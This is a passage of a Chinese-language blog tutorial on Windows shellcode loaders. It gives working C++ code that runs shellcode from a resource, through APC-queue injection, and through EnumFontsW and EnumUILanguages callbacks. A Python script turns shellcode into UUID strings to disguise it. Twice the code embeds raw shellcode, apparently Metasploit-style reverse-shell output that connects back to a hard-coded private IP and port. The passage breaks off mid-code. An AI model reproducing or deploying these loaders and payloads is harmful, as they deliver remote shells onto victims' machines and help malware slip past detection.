<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过资源加载ShellCode</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ResourceLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    FindResource用于查找指定模块（EXE或DLL文件）中指定名称和类型的资源,其语法格式如下:</span></span><br><span class="line"><span class="comment">    HRSRC FindResource(</span></span><br><span class="line"><span class="comment">          HMODULE hModule,  //指向包含要查找的资源的模块的句柄,若该参数为NULL，则查找当前进程中的资源</span></span><br><span class="line"><span class="comment">          LPCTSTR lpName,   //指向资源名称的指针，可以是一个字符串或者一个整数，若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源标识符</span></span><br><span class="line"><span class="comment">          LPCTSTR lpType    //指向资源类型的指针，可以是一个字符串或者一个整数。若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源类型标识符</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    如果查找成功，则返回资源句柄；否则返回NULL</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    HRSRC Res = <span class="built_in">FindResource</span>(<span class="literal">NULL</span>, <span class="built_in">MAKEINTRESOURCE</span>(IDR_SHELLCODE1), <span class="string">L&quot;shellcode&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用于获取资源的大小</span></span><br><span class="line">    DWORD ResSize = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, Res);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span></span><br><span class="line">    HGLOBAL Load = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, Res);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//申请内存</span></span><br><span class="line">    <span class="type">void</span>* buffer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, Load, ResSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ResourceLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	</p>
<h1 id="6-基于APC注入"><a href="#6-基于APC注入" class="headerlink" title="6.基于APC注入"></a>6.基于APC注入</h1><h2 id="什么是APC队列"><a href="#什么是APC队列" class="headerlink" title="什么是APC队列"></a>什么是APC队列</h2><p>异步过程调用（APC）队列是一个与线程关联的队列，用于存储要在该线程上下文中异步执行的函数。操作系统内核会跟踪每个线程的 APC 队列，并在适当的时机触发队列中挂起的函数。APC 队列通常用于实现线程间的异步通信、定时器回调以及异步 I&#x2F;O 操作。</p>
<p>APC 队列包含两种类型的 APC：</p>
<ol>
<li>内核模式 APC：由内核代码发起，通常用于处理内核级别的异步操作，如异步 I&#x2F;O 完成。</li>
<li>用户模式 APC：由用户代码发起，允许用户态应用程序将特定函数插入到线程的 APC 队列中，以便在线程上下文中异步执行</li>
</ol>
<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><ul>
<li>使用 <code>VirtualProtect</code> 函数修改 <code>shellcode</code> 所在内存区域的保护属性，将其设置为可执行、可读、可写（<code>PAGE_EXECUTE_READWRITE</code>），以便执行其中的代码。</li>
<li>获取 <code>NtTestAlert</code> 函数的地址。这是一个内部函数，无法直接通过函数名调用。<code>NtTestAlert</code> 函数用于检查当前线程的 APC 队列。如果队列中有挂起的用户模式 APC 请求，<code>NtTestAlert</code> 将触发它们的执行。</li>
<li>使用 <code>QueueUserAPC</code> 函数向当前线程的 APC 队列添加一个执行 Shellcode 的任务。这将在 <code>NtTestAlert</code> 被调用时执行 Shellcode。</li>
<li>调用 <code>NtTestAlert</code> 函数，触发 APC 队列中的任务执行，实现 Shellcode 的执行</li>
</ul>
<h2 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h2><p>该代码通过在当前线程的 APC 队列中添加一个执行 Shellcode 的任务，并调用 <code>NtTestAlert</code> 函数触发 APC 队列中的任务执行，从而实现了加载并执行 Shellcode 的目的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pNtTestAlert)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7&quot;</span></span><br><span class="line"><span class="string">&quot;\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f\x9b\x68\x02\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApcLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 修改 shellcode 所在内存区域的保护属性，允许执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用</span></span><br><span class="line"><span class="comment">    这个函数用于检查当前线程的 APC（Asynchronous Procedure Call，异步过程调用）队列，如</span></span><br><span class="line"><span class="comment">    果队列中有挂起的用户模式 APC 请求，NtTestAlert 将触发它们的执行</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pNtTestAlert NtTestAlert = (pNtTestAlert)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务</span></span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)(PTHREAD_START_ROUTINE)(LPVOID)shellcode, <span class="built_in">GetCurrentThread</span>(), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）</span></span><br><span class="line">    <span class="built_in">NtTestAlert</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">ApcLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="7-基于回调函数"><a href="#7-基于回调函数" class="headerlink" title="7.基于回调函数"></a>7.基于回调函数</h1><h2 id="EnumFontsW"><a href="#EnumFontsW" class="headerlink" title="EnumFontsW"></a>EnumFontsW</h2><p>这段代码的关键在于它使用 <code>EnumFontsW</code> 函数的回调机制来执行 shellcode。当 <code>EnumFontsW</code> 函数遍历到一个字体时，它将调用 shellcode 作为回调函数来处理字体信息。由于回调函数直接指向 shellcode，这样可以间接地加载并执行 shellcode</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CallBack</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(p, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * EnumFontsW是Windows API，用于枚举系统中所有可用字体</span></span><br><span class="line"><span class="comment">    * 参数1：设备环境句柄，表示要枚举哪个设备的字体</span></span><br><span class="line"><span class="comment">    * 参数2：NULL表示枚举所有字体</span></span><br><span class="line"><span class="comment">    * 参数3：回调函数指针，用于处理每个枚举到的字体信息</span></span><br><span class="line"><span class="comment">    * 参数4：回调函数参数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">EnumFontsW</span>(<span class="built_in">GetDC</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>, (FONTENUMPROCW)p, <span class="literal">NULL</span>); <span class="comment">//回调函数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">CallBack</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="EnumUILanguages"><a href="#EnumUILanguages" class="headerlink" title="EnumUILanguages"></a>EnumUILanguages</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CallBack</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(p, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    EnumUILanguages 函数是在 Windows 操作系统中使用的一个函数，它用于列举安装在系统上的用户界面语言（UI language）</span></span><br><span class="line"><span class="comment">    参数1:指向回调函数的指针,这个回调函数将在每个列举到的用户界面语言上被调用</span></span><br><span class="line"><span class="comment">    参数2:指定列举语言时的选项和标志</span></span><br><span class="line"><span class="comment">    参数3:应用程序定义的一个参数，它将传递给回调函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">EnumUILanguages</span>((UILANGUAGE_ENUMPROC)p, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">CallBack</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="8-基于uuid"><a href="#8-基于uuid" class="headerlink" title="8.基于uuid"></a>8.基于uuid</h1><h2 id="什么是UUID"><a href="#什么是UUID" class="headerlink" title="什么是UUID"></a>什么是UUID</h2><p>UUID（Universally Unique Identifier，通用唯一识别码）是一种为计算机系统中的所有对象分配一个唯一标识符的软件构建块。UUID 是 128 位的数字，通常由 32 个十六进制(16个字节)数字表示，并由连字符分隔成五个部分，形式为 8-4-4-4-12。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">550e8400-e29b-41d4-a716-446655440000</span><br></pre></td></tr></table></figure>

<p>UUID 的目的是在没有中央协调机构的情况下，能够在分布式系统中生成唯一标识符。这意味着，任何人在任何地方都可以创建一个 UUID，而无需担心与其他人创建的 UUID 冲突。UUID 的设计使得它们的全局唯一性非常高，即使在不同的计算机系统和网络中也能保持唯一性。</p>
<p>UUID 通常用于以下场景：</p>
<ul>
<li>数据库中的主键：用 UUID 作为数据库表的主键，确保每个记录都具有唯一的标识符，避免数据冲突。</li>
<li>分布式系统中的对象标识符：在分布式系统中，由于系统组件可能位于不同的计算机或网络上，使用 UUID 作为对象的唯一标识符有助于确保唯一性。</li>
<li>会话标识符：在网络应用中，使用 UUID 作为会话标识符可以确保每个会话都有唯一的识别码。</li>
<li>临时文件名：当需要创建临时文件时，使用 UUID 作为文件名可以确保不会与现有文件冲突。</li>
</ul>
<h2 id="什么是GUID"><a href="#什么是GUID" class="headerlink" title="什么是GUID"></a>什么是GUID</h2><p>GUID（Globally Unique Identifier，全局唯一标识符）是一个 128 位长的数字，用于在软件中为对象分配唯一的标识符。GUID 和 UUID（Universally Unique Identifier）基本上是相同的概念，只是术语上的差别。实际上，GUID 是 UUID 的一种实现。</p>
<p>GUID 通常表示为 32 个十六进制数字，分为五组，用连字符分隔，形式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">550e8400-e29b-41d4-a716-446655440000</span><br></pre></td></tr></table></figure>



<h2 id="shellcode转uuid"><a href="#shellcode转uuid" class="headerlink" title="shellcode转uuid"></a>shellcode转uuid</h2><p>这段代码首先将包含 shellcode 的字节数组进行处理，确保长度是 16 的倍数。然后，将 shellcode 分为 16 字节的块，并为每个块创建一个 UUID，将这些 UUID 存储在一个列表中。最后，将这些 UUID 以 C 语言数组的形式输出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用cs或msf生成的python类型的shellcode</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x30\x89\xe5\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x8b\x48&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x18\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x56\x6a\x00\x53\xff\xd5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存放shellcode转换成的uuid</span></span><br><span class="line">uuid_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保 shellcode 长度是 16 的倍数，用 NOPs (\x90) 进行填充</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">    shellcode += <span class="string">b&#x27;\x90&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(shellcode) % <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每16字节为一组，遍历 shellcode</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">16</span>):</span><br><span class="line">    chunk = shellcode[i:i + <span class="number">16</span>]</span><br><span class="line">    <span class="comment"># 为每组创建一个 UUID（GUID）</span></span><br><span class="line">    uuid_chunk = uuid.UUID(bytes_le=chunk)</span><br><span class="line">    uuid_list.append(<span class="built_in">str</span>(uuid_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出uuid的c语言数组形式</span></span><br><span class="line">uuids = <span class="string">&quot;const char* uuids[] = &#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> uuid <span class="keyword">in</span> uuid_list:</span><br><span class="line">    uuids = uuids + <span class="string">f&quot;\&quot;<span class="subst">&#123;uuid&#125;</span>\&quot;,&quot;</span></span><br><span class="line">uuids = uuids[:-<span class="number">1</span>] + <span class="string">&quot;&#125;;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(uuids)</span><br></pre></td></tr></table></figure>



<h2 id="uuid写入shellcode"><a href="#uuid写入shellcode" class="headerlink" title="uuid写入shellcode"></a>uuid写入shellcode</h2><p>以下代码的主要目的是通过UUID加载并执行shellcode。代码的关键步骤如下：</p>
<ol>
<li>定义一个包含转换为UUID形式的shellcode字符串数组<code>uuids</code>。</li>
<li>创建一个具有执行权限的堆<code>hc</code>。</li>
<li>在堆上分配一块可执行内存<code>buffer</code>。</li>
<li>检查内存分配是否成功，如果失败则输出错误信息并返回。</li>
<li>将UUID值转换回原始的shellcode并将其存储在<code>buffer_backup</code>地址。</li>
<li>使用<code>EnumSystemLocalesA</code>函数调用转换回的shellcode。这是通过将shellcode作为处理每个枚举到的区域设置信息的回调函数的地址传递给<code>EnumSystemLocalesA</code>函数实现的。</li>
<li>关闭内存句柄。</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 